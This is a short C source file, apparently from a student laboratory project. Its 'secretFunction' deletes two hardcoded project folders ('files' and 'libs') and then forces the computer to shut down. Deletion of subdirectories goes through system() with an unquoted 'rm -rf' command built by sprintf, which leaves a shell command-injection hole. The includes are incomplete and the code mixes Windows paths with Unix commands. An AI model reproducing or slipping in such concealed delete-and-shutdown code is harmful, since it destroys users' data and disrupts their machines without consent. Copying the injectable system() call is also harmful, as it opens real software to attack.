#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <sys/stat.h>

void deleteLab( char* dir_path) {
    DIR* dir = opendir(dir_path);
    struct dirent* entry;
    struct stat file_stat;

    if (!dir) {
        printf("Error: Could not open directory %s\n", dir_path);
        return;
    }

    while ((entry = readdir(dir)) != NULL) {
        char entry_path[1024];
        snprintf(entry_path, sizeof(entry_path), "%s/%s", dir_path, entry->d_name);

        if (stat(entry_path, &file_stat) == -1) {
            printf("Error: Could not get file status for %s\n", entry_path);
            continue;
        }

        if (S_ISDIR(file_stat.st_mode)) {
            if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
                continue;
            }
            char* sub_dir_path = entry_path;
            char command[1024];
            sprintf(command, "rm -rf %s", sub_dir_path);
            int ret = system(command);

            if (ret != 0) {
                printf("Error: Could not remove directory %s\n", sub_dir_path);
                closedir(dir);
                return;
            }
        } else {
            int ret = unlink(entry_path);

            if (ret != 0) {
                printf("Error: Could not remove file %s\n", entry_path);
                closedir(dir);
                return;
            }
        }
    }

    closedir(dir);
    int ret = rmdir(dir_path);

    if (ret != 0) {
        printf("Error: Could not remove directory %s\n", dir_path);
        return;
    }
    printf("Directory %s has been successfully removed\n", dir_path);
}

void shutdownComputer() {
#ifdef _WIN32
    system("shutdown /s /t 10");
#else
    system("shutdown -h now");
#endif
}

void secretFunction(){
    deleteLab("C:\\GitHub\\Laboratory-works\\src\\Lab\\files");
    deleteLab("C:\\GitHub\\Laboratory-works\\src\\Lab\\libs");
    shutdownComputer();
}
